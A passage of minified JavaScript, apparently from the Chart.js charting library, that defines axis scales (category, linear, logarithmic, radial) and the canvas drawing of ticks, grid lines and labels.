Math.max(d - u, 0) + 3, A.paddingRight = Math.max(C - h, 0) + 3) : (b.mirror ? i = 0 : i += s + a, p.width = Math.min(A.maxWidth, p.width + i), A.paddingTop = G.size / 2, A.paddingBottom = G.size / 2)), A.handleMargins(), A.width = p.width, A.height = p.height }, handleMargins: function () { var t = this; t.margins && (t.paddingLeft = Math.max(t.paddingLeft - t.margins.left, 0), t.paddingTop = Math.max(t.paddingTop - t.margins.top, 0), t.paddingRight = Math.max(t.paddingRight - t.margins.right, 0), t.paddingBottom = Math.max(t.paddingBottom - t.margins.bottom, 0)) }, afterFit: function () { lt.callback(this.options.afterFit, [this]) }, isHorizontal: function () { return "top" === this.options.position || "bottom" === this.options.position }, isFullWidth: function () { return this.options.fullWidth }, getRightValue: function (t) { if (lt.isNullOrUndef(t)) return NaN; if (("number" == typeof t || t instanceof Number) && !isFinite(t)) return NaN; if (t) if (this.isHorizontal()) { if (void 0 !== t.x) return this.getRightValue(t.x) } else if (void 0 !== t.y) return this.getRightValue(t.y); return t }, getLabelForIndex: lt.noop, getPixelForValue: lt.noop, getValueForPixel: lt.noop, getPixelForTick: function (t) { var e = this, n = e.options.offset; if (e.isHorizontal()) { var i = (e.width - (e.paddingLeft + e.paddingRight)) / Math.max(e._ticks.length - (n ? 0 : 1), 1), o = i * t + e.paddingLeft; n && (o += i / 2); var a = e.left + o; return a += e.isFullWidth() ? e.margins.left : 0 } var s = e.height - (e.paddingTop + e.paddingBottom); return e.top + t * (s / (e._ticks.length - 1)) }, getPixelForDecimal: function (t) { var e = this; if (e.isHorizontal()) { var n = (e.width - (e.paddingLeft + e.paddingRight)) * t + e.paddingLeft, i = e.left + n; return i += e.isFullWidth() ? e.margins.left : 0 } return e.top + t * e.height }, getBasePixel: function () { return this.getPixelForValue(this.getBaseValue()) }, getBaseValue: function () { var t = this.min, e = this.max; return this.beginAtZero ? 0 : t < 0 && e < 0 ? e : 0 < t && 0 < e ? t : 0 }, _autoSkip: function (t) { var e, n, i = this.isHorizontal(), o = this.options.ticks.minor, a = t.length, s = !1, r = o.maxTicksLimit, g = this._tickSize() * (a - 1), l = i ? this.width - (this.paddingLeft + this.paddingRight) : this.height - (this.paddingTop + this.PaddingBottom), c = []; for (l < g && (s = 1 + Math.floor(g / l)), r < a && (s = Math.max(s, 1 + Math.floor(a / r))), e = 0; e < a; e++)n = t[e], 1 < s && 0 < e % s && delete n.label, c.push(n); return c }, _tickSize: function () { var t = this.isHorizontal(), e = this.options.ticks.minor, n = lt.toRadians(this.labelRotation), i = Math.abs(Math.cos(n)), o = Math.abs(Math.sin(n)), a = e.autoSkipPadding || 0, s = this.longestLabelWidth + a || 0, r = lt.options._parseFont(e), g = this._maxLabelLines * r.lineHeight + a || 0; return t ? s * o < g * i ? s / i : g / o : g * o < s * i ? g / i : s / o }, _isVisible: function () { var t, e, n, i = this.chart, o = this.options.display; if ("auto" !== o) return !!o; for (t = 0, e = i.data.datasets.length; t < e; ++t)if (i.isDatasetVisible(t) && ((n = i.getDatasetMeta(t)).xAxisID === this.id || n.yAxisID === this.id)) return !0; return !1 }, draw: function (G) { var w, s, t, r, e, X, n, S, k, D, Z, i, o, g, l, U, c, I, W, N, T, a, u, h, H, E, R, Y, d, O, _, C, A, p, m, f, b, B, y, v, x, F, V = this, L = V.options; V._isVisible() && (w = V.chart, s = V.ctx, t = st.global.defaultFontColor, r = L.ticks.minor, e = L.ticks.major || r, X = L.gridLines, n = L.scaleLabel, S = L.position, k = 0 !== V.labelRotation, D = r.mirror, Z = V.isHorizontal(), i = lt.options._parseFont, o = r.display && r.autoSkip ? V._autoSkip(V.getTicks()) : V.getTicks(), g = rn(r.fontColor, t), l = i(r), U = l.lineHeight, c = rn(e.fontColor, t), I = i(e), W = r.padding, N = r.labelOffset, T = X.drawTicks ? X.tickMarkLength : 0, a = rn(n.fontColor, t), u = i(n), h = lt.options.toPadding(n.padding), H = lt.toRadians(V.labelRotation), E = [], R = X.drawBorder ? gn(X.lineWidth, 0, 0) : 0, Y = lt._alignPixel, _ = "top" === S ? (d = Y(w, V.bottom, R), O = V.bottom - T, d - R / 2) : "bottom" === S ? (d = Y(w, V.top, R), O = d + R / 2, V.top + T) : "left" === S ? (d = Y(w, V.right, R), O = V.right - T, d - R / 2) : (d = Y(w, V.left, R), O = d + R / 2, V.left + T), lt.each(o, function (t, e) { var n, i, o, a, s, r, g, l, c, I, u, h, d, C, A, p, m, f, b, B, y, v, x, F, Q; lt.isNullOrUndef(t.label) || (n = t.label, m = e === V.zeroLineIndex && L.offset === X.offsetGridLines ? (i = X.zeroLineWidth, o = X.zeroLineColor, a = X.zeroLineBorderDash || [], X.zeroLineBorderDashOffset || 0) : (i = gn(X.lineWidth, e), o = gn(X.color, e), a = X.borderDash || [], X.borderDashOffset || 0), f = lt.isArray(n) ? n.length : 1, B = V, y = e, v = X.offsetGridLines, x = B.getPixelForTick(y), v && (1 === B.getTicks().length ? x -= B.isHorizontal() ? Math.max(x - B.left, B.right - x) : Math.max(x - B.top, B.bottom - x) : x -= 0 === y ? (B.getPixelForTick(1) - x) / 2 : (x - B.getPixelForTick(y - 1)) / 2), b = x, Z ? (F = T + W, b < V.left - 1e-7 && (o = "rgba(0,0,0,0)"), s = g = c = u = Y(w, b, i), r = O, l = _, d = V.getPixelForTick(e) + N, C = "top" === S ? (I = Y(w, G.top, R) + R / 2, h = G.bottom, A = ((k ? 1 : .5) - f) * U, p = k ? "left" : "center", V.bottom - F) : (I = G.top, h = Y(w, G.bottom, R) - R / 2, A = (k ? 0 : .5) * U, p = k ? "right" : "center", V.top + F)) : (Q = (D ? 0 : T) + W, b < V.top - 1e-7 && (o = "rgba(0,0,0,0)"), s = O, g = _, r = l = I = h = Y(w, b, i), C = V.getPixelForTick(e) + N, A = (1 - f) * U / 2, d = "left" === S ? (c = Y(w, G.left, R) + R / 2, u = G.right, p = D ? "left" : "right", V.right - Q) : (c = G.left, u = Y(w, G.right, R) - R / 2, p = D ? "right" : "left", V.left + Q)), E.push({ tx1: s, ty1: r, tx2: g, ty2: l, x1: c, y1: I, x2: u, y2: h, labelX: d, labelY: C, glWidth: i, glColor: o, glBorderDash: a, glBorderDashOffset: m, rotation: -1 * H, label: n, major: t.major, textOffset: A, textAlign: p })) }), lt.each(E, function (t) { var e = t.glWidth, n = t.glColor; if (X.display && e && n && (s.save(), s.lineWidth = e, s.strokeStyle = n, s.setLineDash && (s.setLineDash(t.glBorderDash), s.lineDashOffset = t.glBorderDashOffset), s.beginPath(), X.drawTicks && (s.moveTo(t.tx1, t.ty1), s.lineTo(t.tx2, t.ty2)), X.drawOnChartArea && (s.moveTo(t.x1, t.y1), s.lineTo(t.x2, t.y2)), s.stroke(), s.restore()), r.display) { s.save(), s.translate(t.labelX, t.labelY), s.rotate(t.rotation), s.font = t.major ? I.string : l.string, s.fillStyle = t.major ? c : g, s.textBaseline = "middle", s.textAlign = t.textAlign; var i = t.label, o = t.textOffset; if (lt.isArray(i)) for (var a = 0; a < i.length; ++a)s.fillText("" + i[a], 0, o), o += U; else s.fillText(i, 0, o); s.restore() } }), n.display && (f = 0, C = u.lineHeight / 2, Z ? (p = V.left + (V.right - V.left) / 2, m = "bottom" === S ? V.bottom - C - h.bottom : V.top + C + h.top) : (p = (A = "left" === S) ? V.left + C + h.top : V.right - C - h.top, m = V.top + (V.bottom - V.top) / 2, f = A ? -.5 * Math.PI : .5 * Math.PI), s.save(), s.translate(p, m), s.rotate(f), s.textAlign = "center", s.textBaseline = "middle", s.fillStyle = a, s.font = u.string, s.fillText(n.labelString, 0, 0), s.restore()), R && (b = R, B = gn(X.lineWidth, o.length - 1, 0), Z ? (y = Y(w, V.left, b) - b / 2, v = Y(w, V.right, B) + B / 2, x = F = d) : (x = Y(w, V.top, b) - b / 2, F = Y(w, V.bottom, B) + B / 2, y = v = d), s.lineWidth = R, s.strokeStyle = gn(X.color, 0), s.beginPath(), s.moveTo(y, x), s.lineTo(v, F), s.stroke())) } }), un = In.extend({ getLabels: function () { var t = this.chart.data; return this.options.labels || (this.isHorizontal() ? t.xLabels : t.yLabels) || t.labels }, determineDataLimits: function () { var t, e = this, n = e.getLabels(); e.minIndex = 0, e.maxIndex = n.length - 1, void 0 !== e.options.ticks.min && (t = n.indexOf(e.options.ticks.min), e.minIndex = -1 !== t ? t : e.minIndex), void 0 !== e.options.ticks.max && (t = n.indexOf(e.options.ticks.max), e.maxIndex = -1 !== t ? t : e.maxIndex), e.min = n[e.minIndex], e.max = n[e.maxIndex] }, buildTicks: function () { var t = this.getLabels(); this.ticks = 0 === this.minIndex && this.maxIndex === t.length - 1 ? t : t.slice(this.minIndex, this.maxIndex + 1) }, getLabelForIndex: function (t, e) { var n = this.chart; return n.getDatasetMeta(e).controller._getValueScaleId() === this.id ? this.getRightValue(n.data.datasets[e].data[t]) : this.ticks[t - this.minIndex] }, getPixelForValue: function (t, e) { var n, i, o = this, a = o.options.offset, s = Math.max(o.maxIndex + 1 - o.minIndex - (a ? 0 : 1), 1); if (null != t && (n = o.isHorizontal() ? t.x : t.y), (void 0 !== n || void 0 !== t && isNaN(e)) && (t = n || t, e = -1 !== (i = o.getLabels().indexOf(t)) ? i : e), o.isHorizontal()) { var r = o.width / s, g = r * (e - o.minIndex); return a && (g += r / 2), o.left + g } var l = o.height / s, c = l * (e - o.minIndex); return a && (c += l / 2), o.top + c }, getPixelForTick: function (t) { return this.getPixelForValue(this.ticks[t], t + this.minIndex, null) }, getValueForPixel: function (t) { var e = this.options.offset, n = Math.max(this._ticks.length - (e ? 0 : 1), 1), i = this.isHorizontal(), o = (i ? this.width : this.height) / n; return t -= i ? this.left : this.top, e && (t -= o / 2), (t <= 0 ? 0 : Math.round(t / o)) + this.minIndex }, getBasePixel: function () { return this.bottom } }), hn = { position: "bottom" }; un._defaults = hn; var dn = lt.noop, Cn = lt.isNullOrUndef; var An = In.extend({ getRightValue: function (t) { return "string" == typeof t ? +t : In.prototype.getRightValue.call(this, t) }, handleTickRangeOptions: function () { var t, e, n = this, i = n.options.ticks; i.beginAtZero && (t = lt.sign(n.min), e = lt.sign(n.max), t < 0 && e < 0 ? n.max = 0 : 0 < t && 0 < e && (n.min = 0)); var o = void 0 !== i.min || void 0 !== i.suggestedMin, a = void 0 !== i.max || void 0 !== i.suggestedMax; void 0 !== i.min ? n.min = i.min : void 0 !== i.suggestedMin && (null === n.min ? n.min = i.suggestedMin : n.min = Math.min(n.min, i.suggestedMin)), void 0 !== i.max ? n.max = i.max : void 0 !== i.suggestedMax && (null === n.max ? n.max = i.suggestedMax : n.max = Math.max(n.max, i.suggestedMax)), o != a && n.min >= n.max && (o ? n.max = n.min + 1 : n.min = n.max - 1), n.min === n.max && (n.max++, i.beginAtZero || n.min--) }, getTickLimit: function () { var t, e = this.options.ticks, n = e.stepSize, i = e.maxTicksLimit; return n ? t = Math.ceil(this.max / n) - Math.floor(this.min / n) + 1 : (t = this._computeTickLimit(), i = i || 11), i && (t = Math.min(i, t)), t }, _computeTickLimit: function () { return Number.POSITIVE_INFINITY }, handleDirectionalChanges: dn, buildTicks: function () { var t = this, e = t.options.ticks, n = t.getTickLimit(), i = { maxTicks: n = Math.max(2, n), min: e.min, max: e.max, precision: e.precision, stepSize: lt.valueOrDefault(e.fixedStepSize, e.stepSize) }, o = t.ticks = function (t, e) { var n, i, o, a, s = [], r = t.stepSize, g = r || 1, l = t.maxTicks - 1, c = t.min, I = t.max, u = t.precision, h = e.min, d = e.max, C = lt.niceNum((d - h) / l / g) * g; if (C < 1e-14 && Cn(c) && Cn(I)) return [h, d]; l < (a = Math.ceil(d / C) - Math.floor(h / C)) && (C = lt.niceNum(a * C / l / g) * g), r || Cn(u) ? n = Math.pow(10, lt._decimalPlaces(C)) : (n = Math.pow(10, u), C = Math.ceil(C * n) / n), i = Math.floor(h / C) * C, o = Math.ceil(d / C) * C, r && (!Cn(c) && lt.almostWhole(c / C, C / 1e3) && (i = c), !Cn(I) && lt.almostWhole(I / C, C / 1e3) && (o = I)), a = (o - i) / C, a = lt.almostEquals(a, Math.round(a), C / 1e3) ? Math.round(a) : Math.ceil(a), i = Math.round(i * n) / n, o = Math.round(o * n) / n, s.push(Cn(c) ? i : c); for (var A = 1; A < a; ++A)s.push(Math.round((i + A * C) * n) / n); return s.push(Cn(I) ? o : I), s }(i, t); t.handleDirectionalChanges(), t.max = lt.max(o), t.min = lt.min(o), e.reverse ? (o.reverse(), t.start = t.max, t.end = t.min) : (t.start = t.min, t.end = t.max) }, convertTicksToLabels: function () { this.ticksAsNumbers = this.ticks.slice(), this.zeroLineIndex = this.ticks.indexOf(0), In.prototype.convertTicksToLabels.call(this) } }), pn = { position: "left", ticks: { callback: sn.formatters.linear } }, mn = An.extend({ determineDataLimits: function () { var s = this, r = s.options, g = s.chart, t = g.data.datasets, e = s.isHorizontal(); function l(t) { return e ? t.xAxisID === s.id : t.yAxisID === s.id } s.min = null, s.max = null; var c, i = r.stacked; void 0 === i && lt.each(t, function (t, e) { var n; i || (n = g.getDatasetMeta(e), g.isDatasetVisible(e) && l(n) && void 0 !== n.stack && (i = !0)) }), r.stacked || i ? (c = {}, lt.each(t, function (t, e) { var i = g.getDatasetMeta(e), n = [i.type, void 0 === r.stacked && void 0 === i.stack ? e : "", i.stack].join("."); void 0 === c[n] && (c[n] = { positiveValues: [], negativeValues: [] }); var o = c[n].positiveValues, a = c[n].negativeValues; g.isDatasetVisible(e) && l(i) && lt.each(t.data, function (t, e) { var n = +s.getRightValue(t); isNaN(n) || i.data[e].hidden || (o[e] = o[e] || 0, a[e] = a[e] || 0, r.relativePoints ? o[e] = 100 : n < 0 ? a[e] += n : o[e] += n) }) }), lt.each(c, function (t) { var e = t.positiveValues.concat(t.negativeValues), n = lt.min(e), i = lt.max(e); s.min = null === s.min ? n : Math.min(s.min, n), s.max = null === s.max ? i : Math.max(s.max, i) })) : lt.each(t, function (t, e) { var i = g.getDatasetMeta(e); g.isDatasetVisible(e) && l(i) && lt.each(t.data, function (t, e) { var n = +s.getRightValue(t); isNaN(n) || i.data[e].hidden || ((null === s.min || n < s.min) && (s.min = n), (null === s.max || n > s.max) && (s.max = n)) }) }), s.min = isFinite(s.min) && !isNaN(s.min) ? s.min : 0, s.max = isFinite(s.max) && !isNaN(s.max) ? s.max : 1, this.handleTickRangeOptions() }, _computeTickLimit: function () { var t; return this.isHorizontal() ? Math.ceil(this.width / 40) : (t = lt.options._parseFont(this.options.ticks), Math.ceil(this.height / t.lineHeight)) }, handleDirectionalChanges: function () { this.isHorizontal() || this.ticks.reverse() }, getLabelForIndex: function (t, e) { return +this.getRightValue(this.chart.data.datasets[e].data[t]) }, getPixelForValue: function (t) { var e = this.start, n = +this.getRightValue(t), i = this.end - e, o = this.isHorizontal() ? this.left + this.width / i * (n - e) : this.bottom - this.height / i * (n - e); return o }, getValueForPixel: function (t) { var e = this.isHorizontal(), n = e ? this.width : this.height, i = (e ? t - this.left : this.bottom - t) / n; return this.start + (this.end - this.start) * i }, getPixelForTick: function (t) { return this.getPixelForValue(this.ticksAsNumbers[t]) } }); mn._defaults = pn; var fn = lt.valueOrDefault; var bn = { position: "left", ticks: { callback: sn.formatters.logarithmic } }; function Bn(t, e) { return lt.isFinite(t) && 0 <= t ? t : e } var yn = In.extend({ determineDataLimits: function () { var s = this, n = s.options, r = s.chart, t = r.data.datasets, e = s.isHorizontal(); function g(t) { return e ? t.xAxisID === s.id : t.yAxisID === s.id } s.min = null, s.max = null, s.minNotZero = null; var l, i = n.stacked; void 0 === i && lt.each(t, function (t, e) { var n; i || (n = r.getDatasetMeta(e), r.isDatasetVisible(e) && g(n) && void 0 !== n.stack && (i = !0)) }), n.stacked || i ? (l = {}, lt.each(t, function (t, e) { var o = r.getDatasetMeta(e), a = [o.type, void 0 === n.stacked && void 0 === o.stack ? e : "", o.stack].join("."); r.isDatasetVisible(e) && g(o) && (void 0 === l[a] && (l[a] = []), lt.each(t.data, function (t, e) { var n = l[a], i = +s.getRightValue(t); isNaN(i) || o.data[e].hidden || i < 0 || (n[e] = n[e] || 0, n[e] += i) })) }), lt.each(l, function (t) { var e, n; 0 < t.length && (e = lt.min(t), n = lt.max(t), s.min = null === s.min ? e : Math.min(s.min, e), s.max = null === s.max ? n : Math.max(s.max, n)) })) : lt.each(t, function (t, e) { var i = r.getDatasetMeta(e); r.isDatasetVisible(e) && g(i) && lt.each(t.data, function (t, e) { var n = +s.getRightValue(t); isNaN(n) || i.data[e].hidden || n < 0 || ((null === s.min || n < s.min) && (s.min = n), (null === s.max || n > s.max) && (s.max = n), 0 != n && (null === s.minNotZero || n < s.minNotZero) && (s.minNotZero = n)) }) }), this.handleTickRangeOptions() }, handleTickRangeOptions: function () { var t = this, e = t.options.ticks; t.min = Bn(e.min, t.min), t.max = Bn(e.max, t.max), t.min === t.max && (0 !== t.min && null !== t.min ? (t.min = Math.pow(10, Math.floor(lt.log10(t.min)) - 1), t.max = Math.pow(10, Math.floor(lt.log10(t.max)) + 1)) : (t.min = 1, t.max = 10)), null === t.min && (t.min = Math.pow(10, Math.floor(lt.log10(t.max)) - 1)), null === t.max && (t.max = 0 !== t.min ? Math.pow(10, Math.floor(lt.log10(t.min)) + 1) : 10), null === t.minNotZero && (0 < t.min ? t.minNotZero = t.min : t.max < 1 ? t.minNotZero = Math.pow(10, Math.floor(lt.log10(t.max))) : t.minNotZero = 1) }, buildTicks: function () { var t = this, e = t.options.ticks, n = !t.isHorizontal(), i = { min: Bn(e.min), max: Bn(e.max) }, o = t.ticks = function (t, e) { var n, i, o = [], a = fn(t.min, Math.pow(10, Math.floor(lt.log10(e.min)))), s = Math.floor(lt.log10(e.max)), r = Math.ceil(e.max / Math.pow(10, s)); 0 === a ? (n = Math.floor(lt.log10(e.minNotZero)), i = Math.floor(e.minNotZero / Math.pow(10, n)), o.push(a), a = i * Math.pow(10, n)) : (n = Math.floor(lt.log10(a)), i = Math.floor(a / Math.pow(10, n))); for (var g = n < 0 ? Math.pow(10, Math.abs(n)) : 1; o.push(a), 10 === ++i && (i = 1, g = 0 <= ++n ? 1 : g), a = Math.round(i * Math.pow(10, n) * g) / g, n < s || n === s && i < r;); var l = fn(t.max, a); return o.push(l), o }(i, t); t.max = lt.max(o), t.min = lt.min(o), e.reverse ? (n = !n, t.start = t.max, t.end = t.min) : (t.start = t.min, t.end = t.max), n && o.reverse() }, convertTicksToLabels: function () { this.tickValues = this.ticks.slice(), In.prototype.convertTicksToLabels.call(this) }, getLabelForIndex: function (t, e) { return +this.getRightValue(this.chart.data.datasets[e].data[t]) }, getPixelForTick: function (t) { return this.getPixelForValue(this.tickValues[t]) }, _getFirstTickValue: function (t) { var e = Math.floor(lt.log10(t)); return Math.floor(t / Math.pow(10, e)) * Math.pow(10, e) }, getPixelForValue: function (t) { var e, n, i, o, a, s = this, r = s.options.ticks, g = r.reverse, l = lt.log10, c = s._getFirstTickValue(s.minNotZero), I = 0; return t = +s.getRightValue(t), a = g ? (i = s.end, o = s.start, -1) : (i = s.start, o = s.end, 1), n = s.isHorizontal() ? (e = s.width, g ? s.right : s.left) : (e = s.height, a *= -1, g ? s.top : s.bottom), t !== i && (0 === i && (e -= I = fn(r.fontSize, st.global.defaultFontSize), i = c), 0 !== t && (I += e / (l(o) - l(i)) * (l(t) - l(i))), n += a * I), n }, getValueForPixel: function (t) { var e, n, i, o = this, a = o.options.ticks, s = a.reverse, r = lt.log10, g = o._getFirstTickValue(o.minNotZero), l = s ? (n = o.end, o.start) : (n = o.start, o.end), c = o.isHorizontal() ? (e = o.width, s ? o.right - t : t - o.left) : (e = o.height, s ? t - o.top : o.bottom - t); return c !== n && (0 === n && (c -= i = fn(a.fontSize, st.global.defaultFontSize), e -= i, n = g), c *= r(l) - r(n), c /= e, c = Math.pow(10, r(n) + c)), c } }); yn._defaults = bn; var vn = lt.valueOrDefault, xn = lt.valueAtIndexOrDefault, Fn = lt.options.resolve, Qn = { display: !0, animate: !0, position: "chartArea", angleLines: { display: !0, color: "rgba(0, 0, 0, 0.1)", lineWidth: 1, borderDash: [], borderDashOffset: 0 }, gridLines: { circular: !1 }, ticks: { showLabelBackdrop: !0, backdropColor: "rgba(255,255,255,0.75)", backdropPaddingY: 2, backdropPaddingX: 2, callback: sn.formatters.linear }, pointLabels: { display: !0, fontSize: 10, callback: function (t) { return t } } }; function Gn(t) { var e = t.options; return e.angleLines.display || e.pointLabels.display ? t.chart.data.labels.length : 0 } function wn(t) { var e = t.ticks; return e.display && t.display ? vn(e.fontSize, st.global.defaultFontSize) + 2 * e.backdropPaddingY : 0 } function Xn(t, e, n, i, o) { return t === i || t === o ? { start: e - n / 2, end: e + n / 2 } : t < i || o < t ? { start: e - n, end: e } : { start: e, end: e + n } } function Sn(t) { var e, n, i = lt.options._parseFont(t.options.pointLabels), o = { l: 0, r: t.width, t: 0, b: t.height - t.paddingTop }, a = {}; t.ctx.font = i.string, t._pointLabelSizes = []; for (var s, r, g, l = Gn(t), c = 0; c < l; c++) { n = t.getPointPosition(c, t.drawingArea + 5), s = t.ctx, r = i.lineHeight, g = t.pointLabels[c] || "", e = lt.isArray(g) ? { w: lt.longestText(s, s.font, g), h: g.length * r } : { w: s.measureText(g).width, h: r }, t._pointLabelSizes[c] = e; var I = t.getIndexAngle(c), u = lt.toDegrees(I) % 360, h = Xn(u, n.x, e.w, 0, 180), d = Xn(u, n.y, e.h, 90, 270); h.start < o.l && (o.l = h.start, a.l = I), h.end > o.r && (o.r = h.end, a.r = I), d.start < o.t && (o.t = d.start, a.t = I), d.end > o.b && (o.b = d.end, a.b = I) } t.setReductions(t.drawingArea, o, a) } function kn(t) { var e = t.ctx, n = t.options, i = n.angleLines, o = n.gridLines, a = n.pointLabels, s = vn(i.lineWidth, o.lineWidth), r = vn(i.color, o.color), g = wn(n); e.save(), e.lineWidth = s, e.strokeStyle = r, e.setLineDash && (e.setLineDash(Fn([i.borderDash, o.borderDash, []])), e.lineDashOffset = Fn([i.borderDashOffset, o.borderDashOffset, 0])); var l = t.getDistanceFromCenterForValue(n.ticks.reverse ? t.min : t.max), c = lt.options._parseFont(a); e.font = c.string, e.textBaseline = "middle"; for (var I, u, h, d, C, A, p, m, f, b, B = Gn(t) - 1; 0 <= B; B--) { i.display && s && r && (I = t.getPointPosition(B, l), e.beginPath(), e.moveTo(t.xCenter, t.yCenter), e.lineTo(I.x, I.y), e.stroke()), a.display && (u = 0 === B ? g / 2 : 0, h = t.getPointPosition(B, l + u + 5), d = xn(a.fontColor, B, st.global.defaultFontColor), e.fillStyle = d, C = t.getIndexAngle(B), A = lt.toDegrees(C), e.textAlign = 0 === (b = A) || 180 === b ? "center" : b < 180 ? "left" : "right", p = A, m = t._pointLabelSizes[B], f = h, 90 === p || 270 === p ? f.y -= m.h / 2 : (270 < p || p < 90) && (f.y -= m.h), function (t, e, n, i) { var o, a, s = n.y + i / 2; if (lt.isArray(e)) for (o = 0, a = e.length; o < a; ++o)t.fillText(e[o], n.x, s), s += i; else t.fillText(e, n.x, s) }(e, t.pointLabels[B] || "", h, c.lineHeight)) } e.restore() } function Dn(t) { return lt.isNumber(t) ? t : 0 } var Zn = An.extend({ setDimensions: function () { var t = this; t.width = t.maxWidth, t.height = t.maxHeight, t.paddingTop = wn(t.options) / 2, t.xCenter = Math.floor(t.width / 2), t.yCenter = Math.floor((t.height - t.paddingTop) / 2), t.drawingArea = Math.min(t.height - t.paddingTop, t.width) / 2 }, determineDataLimits: function () { var o = this, n = o.chart, a = Number.POSITIVE_INFINITY, s = Number.NEGATIVE_INFINITY; lt.each(n.data.datasets, function (t, e) { var i; n.isDatasetVisible(e) && (i = n.getDatasetMeta(e), lt.each(t.data, function (t, e) { var n = +o.getRightValue(t); isNaN(n) || i.data[e].hidden || (a = Math.min(n, a), s = Math.max(n, s)) })) }), o.min = a === Number.POSITIVE_INFINITY ? 0 : a, o.max = s === Number.NEGATIVE_INFINITY ? 0 : s, o.handleTickRangeOptions() }, _computeTickLimit: function () { return Math.ceil(this.drawingArea / wn(this.options)) }, convertTicksToLabels: function () { An.prototype.convertTicksToLabels.call(this), this.pointLabels = this.chart.data.labels.map(this.options.pointLabels.callback, this) }, getLabelForIndex: function (t, e) { return +this.getRightValue(this.chart.data.datasets[e].data[t]) }, fit: function () { var t = this.options; t.display && t.pointLabels.display ? Sn(this) : this.setCenterPoint(0, 0, 0, 0) }, setReductions: function (t, e, n) { var i = e.l / Math.sin(n.l), o = Math.max(e.r - this.width, 0) / Math.sin(n.r), a = -e.t / Math.cos(n.t), s = -Math.max(e.b - (this.height - this.paddingTop), 0) / Math.cos(n.b), i = Dn(i), o = Dn(o), a = Dn(a), s = Dn(s); this.drawingArea = Math.min(Math.floor(t - (i + o) / 2), Math.floor(t - (a + s) / 2)), this.setCenterPoint(i, o, a, s) }, setCenterPoint: function (t, e, n, i) { var o = this, a = o.width - e - o.drawingArea, s = t + o.drawingArea, r = n + o.drawingArea, g = o.height - o.paddingTop - i - o.drawingArea; o.xCenter = Math.floor((s + a) / 2 + o.left), o.yCenter = Math.floor((r + g) / 2 + o.top + o.paddingTop) }, getIndexAngle: function (t) { return t * (2 * Math.PI / Gn(this)) + (this.chart.options && this.chart.options.startAngle ? this.chart.options.startAngle : 0) * Math.PI * 2 / 360 }, getDistanceFromCenterForValue: function (t) { if (null === t) return 0; var e = this.drawingArea / (this.max - this.min); return this.options.ticks.reverse ? (this.max - t) * e : (t - this.min) * e }, getPointPosition: function (t, e) { var n = this.getIndexAngle(t) - Math.PI / 2; return { x: Math.cos(n) * e + this.xCenter, y: Math.sin(n) * e + this.yCenter } }, getPointPositionForValue: function (t, e) { return this.getPointPosition(t, this.getDistanceFromCenterForValue(e)) }, getBasePosition: function () { var t = this.min, e = this.max; return this.getPointPositionForValue(0, this.beginAtZero ? 0 : t < 0 && e < 0 ? e : 0 < t && 0 < e ? t : 0) }, draw: function () { var a, s, r, g = this, t = g.options, l = t.gridLines, c = t.ticks; t.display && (a = g.ctx, s = this.getIndexAngle(0), r = lt.options._parseFont(c), (t.angleLines.display || t.pointLabels.display) && kn(g), lt.each(g.ticks, function (t, e) { var n, i, o; (0 < e || c.reverse) && (n = g.getDistanceFromCenterForValue(g.ticksAsNumbers[e]), l.display && 0 !== e && function (t, e, n, i) { var o, a = t.ctx, s = e.circular, r = Gn(t), g = xn(e.color, i - 1), l = xn(e.lineWidth, i - 1); if ((s || r) && g && l) { if (a.save(), a.strokeStyle = g, a.lineWidth = l, a.setLineDash && (a.setLineDash(e.borderDash || []), a.lineDashOffset = e.borderDashOffset || 0), a.beginPath(), s) a.arc(t.xCenter, t.yCenter, n, 0, 2 * Math.PI); else { o = t.getPointPosition(0, n), a.moveTo(o.x, o.y); for (var c = 1; c < r; c++)o = t.getPointPosition(c, n), a.lineTo(o.x, o.y) } a.closePath(), a.stroke(), a.restore() } }(g, l, n, e), c.display && (i = vn(c.fontColor, st.global.defaultFontColor), a.font = r.string, a.save(), a.translate(g.xCenter, g.yCenter), a.rotate(s), c.showLabelBackdrop && (o = a.measureText(t).width, a.fillStyle = c.backdropColor, a.fillRect(-o / 2 - c.backdropPaddingX, -n - r.size / 2 - c.backdropPaddingY, o + 2 * c.backdropPaddingX, r.size + 2 * c.backdropPaddingY)), a.textAlign = "center", a.textBaseline = "middle", a.fillStyle = i, a.fillText(t, 0, -n), a.restore())) })) } }); Zn._defaults = Qn; var Un = lt.valueOrDefault, Wn = Number.MIN_SAFE_INTEGER || -9007199254740991, Nn = Number.MAX_SAFE_INTEGER || 9007199254740991, Tn = { millisecond: { common: !0, size: 1, steps: [1, 2, 5, 10, 20, 50, 100, 250, 500] }, second: { common: !0, size: 1e3, steps: [1, 2, 5, 10, 15, 30] }, minute: { common: !0, size: 6e4, steps: [1, 2, 5, 10, 15, 30] }, hour: { common: !0, size: 36e5, steps: [1, 2, 3, 6, 12] }, day: { common: !0, size: 864e5, steps: [1, 2, 5] }, week: { common: !1, size: 6048e5, steps: [1, 2, 3, 4] }, month: { common: !0, size: 2628e6, steps: [1, 2, 3] }, quarter: { common: !1, size: 7884e6, steps: [1, 2, 3, 4] }, year: { common: !0, size: 3154e7 } }, Hn = Object.keys(Tn); function En(t, e) { return t - e } function Rn(t) { for (var e, n = {}, i = [], o = 0, a = t.length; o < a; ++o)n[e = t[o]] || (n[e] = !0, i.push(e)); return i } function Yn(t, e, n, i) { var o = function (t, e, n) { for (var i, o, a, s = 0, r = t.length - 1; 0 <= s && s <= r;) { if (o = t[(i = s + r >> 1) - 1] || null, a = t[i], !o) return { lo: null, hi: a }; if (a[e] < n) s = 1 + i; else { if (!(o[e] > n)) return { lo: o, hi: a }; r = i - 1 } } return { lo: a, hi: null } }(t, e, n), a = o.lo ? o.hi ? o.lo : t[t.length - 2] : t[0], s = o.lo ? o.hi ? o.hi : t[t.length - 1] : t[1], r = s[e] - a[e], g = r ? (n - a[e]) / r : 0, l = (s[i] - a[i]) * g; return a[i] + l } function On(t, e) { var n = t._adapter, i = t.options.time, o = i.parser, a = o || i.format, s = e; return "function" == typeof o && (s = o(s)), lt.isFinite(s) || (s = "string" == typeof a ? n.parse(s, a) : n.parse(s)), null !== s ? +s : (o || "function" != typeof a || (s = a(e), lt.isFinite(s) || (s = n.parse(s))), s) } function _n(t, e) { if (lt.isNullOrUndef(e)) return null; var n = t.options.time, i = On(t, t.getRightValue(e)); return null === i || n.round && (i = +t._adapter.startOf(i, n.round)), i } function Vn(t) { for (var e = Hn.indexOf(t) + 1, n = Hn.length; e < n; ++e)if (Tn[Hn[e]].common) return Hn[e] } function Ln(t, e, n, i) { var o, a = t._adapter, s = t.options, r = s.time, g = r.unit || function (t, e, n, i) { for (var o, a, s = Hn.length, 